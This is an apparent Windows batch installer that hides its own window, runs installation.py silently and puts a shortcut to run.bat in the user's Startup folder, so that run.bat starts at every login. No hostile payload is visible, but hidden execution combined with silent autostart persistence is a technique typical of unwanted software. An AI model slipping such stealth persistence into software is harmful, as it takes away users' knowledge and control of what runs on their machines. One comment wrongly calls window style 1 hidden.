@echo off
REM Hide the window
if not "%1"=="hidden" (
     start /b /min cmd /c "%~f0" hidden
    exit /b
)

REM Run installation.py using pythonw.exe (no window)
pythonw installation.py

REM Get the current directory (where Install.bat is located)
set "current_dir=%~dp0"

REM Define the path to run.bat
set "run_bat=%current_dir%run.bat"

REM Define the path to the Startup folder
set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Create a shortcut to run.bat in the Startup folder
echo Set oWS = WScript.CreateObject("WScript.Shell") > "%temp%\create_shortcut.vbs"
echo sLinkFile = "%startup_folder%\RunAtStartup.lnk" >> "%temp%\create_shortcut.vbs"
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%temp%\create_shortcut.vbs"
echo oLink.TargetPath = "%run_bat%" >> "%temp%\create_shortcut.vbs"
echo oLink.WindowStyle = 1 >> "%temp%\create_shortcut.vbs"  REM 1 = Hidden window
echo oLink.Save >> "%temp%\create_shortcut.vbs"
cscript //nologo "%temp%\create_shortcut.vbs"
del "%temp%\create_shortcut.vbs"

REM Run run.bat immediately
call "%run_bat%"